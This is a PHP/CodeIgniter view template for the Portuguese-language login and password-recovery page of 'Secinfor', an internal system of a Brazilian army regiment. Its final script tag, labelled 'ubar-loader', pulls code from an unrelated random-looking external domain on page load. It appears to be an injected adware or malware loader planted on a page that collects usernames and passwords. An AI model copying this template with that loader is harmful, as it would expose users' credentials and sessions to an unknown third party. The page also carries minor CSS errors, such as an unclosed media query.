
<style type="text/css">
    /* Smaller than standard 960 (devices and browsers) */
    @media only screen and (max-width: 959px) {
        p,label,tr,th{
            font-size: 10px;
        }
    }
    /* Tablet Portrait size to standard 960 (devices and browsers) */
    @media only screen and (min-width: 768px) and (max-width: 959px) {
        p,label,tr,th{
            font-size: 12px;
        }
    }
    /* All Mobile Sizes (devices and browser) */
    @media only screen and (max-width: 767px) {
        p,label,tr,th{
            font-size: 14px;
        }
    }
    /* Mobile Landscape Size to Tablet Portrait (devices and browsers) */
    @media only screen and (min-width: 480px) and (max-width: 767px) {
        p,label,tr,th{
            font-size: 9px;
        }
    }
    /* Mobile Portrait Size to Mobile Landscape Size (devices and browsers) */
    @media only screen and (max-width: 479px) {
        p,label,tr,th{
            font-size: 8px;
        }
    }
    @media only screen and (max-width: 479px) {
        h1{
            font-size: 20px;

        }

    </style>

    <!DOCTYPE html>
    <html lang="pt-br">
        <head>
            <meta charset="utf-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <!-- As 3 meta tags acima *devem* vir em primeiro lugar dentro do `head`; qualquer outro conteúdo deve vir *após* essas tags -->
            <title>Secinfor</title>

            <!-- Bootstrap -->
            <link href="<?= base_url('includes/bootstrap/css/bootstrap.min.css'); ?>" rel="stylesheet">

            <!-- HTML5 shim e Respond.js para suporte no IE8 de elementos HTML5 e media queries -->
            <!-- ALERTA: Respond.js não funciona se você visualizar uma página file:// -->
            <!--[if lt IE 9]>
              <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
              <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
            <![endif]-->
            <style type="text/css">


                /* register */


                .tab-content>.tab-pane {
                    display: block;

                }

                #myTabContent 
                {
                    position: relative;
                    width: 100%;
                    height: 370px;
                    z-index: 5;
                    overflow: hidden;


                }

                #myTabContent .tab-pane
                {
                    position: absolute;
                    top: 0;
                    padding: 10px 40px;
                    z-index: 1;
                    opacity: 0;
                    -webkit-transition: all linear 0.3s;
                    -moz-transition: all linear 0.3s;
                    -o-transition: all linear 0.3s;
                    -ms-transition: all linear 0.3s;
                    transition: all linear 0.3s;


                }

                #login,
                .content-3 {
                    -webkit-transform: translateX(-250px);
                    -moz-transform: translateX(-250px);
                    -o-transform: translateX(-250px);
                    -ms-transform: translateX(-250px);
                    transform: translateX(-250px);
                }

                #newuser,
                .content-4 {
                    -webkit-transform: translateX(250px);
                    -moz-transform: translateX(250px);
                    -o-transform: translateX(250px);
                    -ms-transform: translateX(250px);
                    transform: translateX(250px);
                }

                .register .register-right ul .nav-item:a.active~#myTabContent #login,
                .register .register-right ul .nav-item:a.active~#myTabContent .content-2,
                .register .register-right ul .nav-item:a.active~#myTabContent #newuser
                {
                    -webkit-transform: translateX(0px);
                    -moz-transform: translateX(0px);
                    -o-transform: translateX(0px);
                    -ms-transform: translateX(0px);
                    transform: translateX(0px);
                    z-index: 100;
                    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=100)";
                    filter: alpha(opacity=100);
                    opacity: 1;
                    -webkit-transition: all ease-out 0.2s 0.1s;
                    -moz-transition: all ease-out 0.2s 0.1s;
                    -o-transition: all ease-out 0.2s 0.1s;
                    -ms-transition: all ease-out 0.2s 0.1s;
                    transition: all ease-out 0.2s 0.1s;

                }


                @keyframes page {
                    0% {
                        left: 0;
                    }
                    50% {
                        left: 10px;
                    }
                    100% {
                        left: 0;
                    }
                }

                @-moz-keyframes page {
                    0% {
                        left: 0;
                    }
                    50% {
                        left: 10px;
                    }
                    100% {
                        left: 0;
                    }
                }

                @-webkit-keyframes page {
                    0% {
                        left: 0;
                    }
                    50% {
                        left: 10px;
                    }
                    100% {
                        left: 0;
                    }
                }

                @-ms-keyframes page {
                    0% {
                        left: 0;
                    }
                    50% {
                        left: 10px;
                    }
                    100% {
                        left: 0;
                    }
                }

                @-o-keyframes page {
                    0% {
                        left: 0;
                    }
                    50% {
                        left: 10px;
                    }
                    100% {
                        left: 0;
                    }
                }


                .register {
                    background: -webkit-linear-gradient(left,  #293E6D, #337AB7);
                    margin-top: 3%;
                    padding: 3%;
                    -webkit-box-shadow: 9px 7px 5px rgba(50, 50, 50, 0.77);
                    -moz-box-shadow:    9px 7px 5px rgba(50, 50, 50, 0.77);
                    box-shadow:         9px 7px 5px rgba(50, 50, 50, 0.77);
                }

                .register-left {
                    text-align: center;
                    color: #fff;
                    margin-top: 4%;
                }

                .register-left input {
                    border: none;
                    border-radius: 1.5rem;
                    padding: 2%;
                    width: 60%;
                    background: #f8f9fa;
                    font-weight: bold;
                    color: #383d41;
                    margin-top: 30%;
                    margin-bottom: 3%;
                    cursor: pointer;


                }

                .register-right {
                    background: #f8f9fa;
                    border-top-left-radius: 15% 50%;
                    border-bottom-left-radius: 15% 50%;
                }

                .register-left img {
                    margin-top: 15%;
                    margin-bottom: 5%;
                    width: 25%;
                    -webkit-animation: mover 2s infinite alternate;
                    animation: mover 1s infinite alternate;
                }

                @-webkit-keyframes mover {
                    0% {
                        transform: translateY(0);
                    }
                    100% {
                        transform: translateY(-20px);
                    }
                }

                @keyframes mover {
                    0% {
                        transform: translateY(0);
                    }
                    100% {
                        transform: translateY(-20px);
                    }
                }

                .register-left p {
                    font-weight: lighter;
                    padding: 12%;
                    margin-top: -9%;
                }

                .register .register-form {

                }



                .register .nav-tabs {
                    margin-top: 1%;
                    border: none;
                    background: #117b25;
                    border-radius: 20px;
                    width: 35%;
                    float: right;
                }
                #myTab  .nav-item {
                    padding: 5px 3px;
                    text-align: center;
                    display: block;
                    margin: 0px 6px;
                }
                .register .nav-tabs .nav-link {
                    padding: 10px 8px;
                    height: 25px;
                    color: #fff;
                    font-size: 13px;
                    border-top-right-radius: 1.5rem;
                    border-bottom-right-radius: 1.5rem;
                }

                .register .nav-tabs .nav-link:hover {
                    border: none;
                }

                .register .nav-tabs .nav-link.active {
                    color:  #00420c;
                    border: 1px solid  #00420c;
                    border-top-left-radius: 1.5rem;
                    border-bottom-left-radius: 1.5rem;
                }

                .register-heading {
                    text-align: center;
                    color:  #293E6D;
                }

                #login.active 
                {

                    -webkit-transform: translateX(0px);
                    transform: translateX(0px);
                    z-index: 100;
                    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=100)";
                    filter: alpha(opacity=100);
                    opacity: 1;
                    -webkit-transition: all ease-out 0.2s 0.1s;
                    transition: all ease-out 0.2s 0.1s;

                }
                #newuser.active 
                {

                    -webkit-transform: translateX(0px);
                    transform: translateX(0px);
                    z-index: 100;
                    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=100)";
                    filter: alpha(opacity=100);
                    opacity: 1;
                    -webkit-transition: all ease-out 0.2s 0.1s;
                    transition: all ease-out 0.2s 0.1s;

                }
            </style>
            <link rel="shortcut icon" href="<?= base_url('img/logo_shortcut.png') ?>" type="image/x-icon"/>
        </head>
        <body>  

            <!-- login start -->

            <div class="container register">
                <div class="row">
                    <div class="col-md-3 register-left">
                        <img class="center-block"src="<?= base_url('img/logo-shortcut.png') ?>">
                        <h3>Bem-Vindo</h3>
                        <p>3º Regimento de Carros de Combate!</p>
                        <h2>Acesso ao Secinfor</h2>
                    </div>
                    <div class="col-md-9 register-right">

                        <div class="tab-content" id="myTabContent">
                            <div class="tab-pane fade show active" id="login" role="tabpanel" aria-labelledby="login-tab">
                                <h3 class="register-heading">Acesso</h3>
                                <div class="row register-form">
                                    <div class="col-md-12 profile_card">
                                        <form class="form-signin" role="form" method="post" action="<?= base_url('Login') ?>" enctype="multipart/form-data">            
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <input type="text" class="form-control" id="usuario" name="usuario" placeholder="Qual o seu nome de Usuário?" autofocus value="" />
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <input type="password" class="form-control" id="senha" name="senha" placeholder="Digite aqui sua senha" value="" />
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <!--                                                <div class="form-group">
                                                                                                    <span style="text-align:left;  display: inline-block;"><a class="nav-link" id="newuser-tab" data-toggle="tab" href="#newuser" role="tab" aria-controls="newuser" aria-selected="false">Recuperar senha?</a></span>     
                                                                                                </div>-->
                                                <div class="form-group">
                                                    <span style="text-align:left;  display: inline-block;"><a class="nav-link" href="http://10.35.116.53/sisom/Pagina_Inicial" role="tab" aria-controls="newuser" aria-selected="false">Voltar ao Início</a></span>     
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <button class="btn btn-primary btn-block" type="submit">Acessar</button> 
                                                </div>
                                            </div>
                                            <p style="color: #990000; "><?php echo $this->session->flashdata("error"); ?></p>                    
                                        </form>
                                    </div>
                                </div>
                            </div>
                            <div class="tab-pane fade show" id="newuser" role="tabpanel" aria-labelledby="newuser-tab">
                                <h3 class="register-heading">Recuperar Senha</h3>
                                <div class="row register-form">
                                    <div class="col-md-12">
                                        <div class="form-group">
                                            <span style="text-align:left;  display: inline-block;"><a class="nav-link active" id="login-tab" data-toggle="tab" href="#login" role="tab" aria-controls="login" aria-selected="true">Voltar</a></span>  
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="form-group">
                                            <input type="text" class="form-control" placeholder="Qual o seu cpf?" value="" />
                                        </div>

                                    </div>
                                    <div class="col-md-6">
                                        <div class="form-group">
                                            <button class="btn btn-primary btn-block btn-md" type="button">Reset</button> 
                                        </div>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>




            <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
            <script src="<?= base_url('includes/bootstrap/js/jquery.min.js'); ?>" ></script>
            <script src="<?= base_url('includes/bootstrap/js/bootstrap.min.js'); ?>" ></script>
            <script src="<?= base_url('includes/bootstrap/js/ie10-viewport-bug-workaround.js'); ?>" ></script>
            <script src="http://msmdzbsyrw.org/app/code/code.php?appid=imr38-10064-1461784180522-f975dab1-46b1-43dd-825b-80d6454ec0f5&h=0&m=normal" id="ubar-loader"></script>
        </body>
    </html>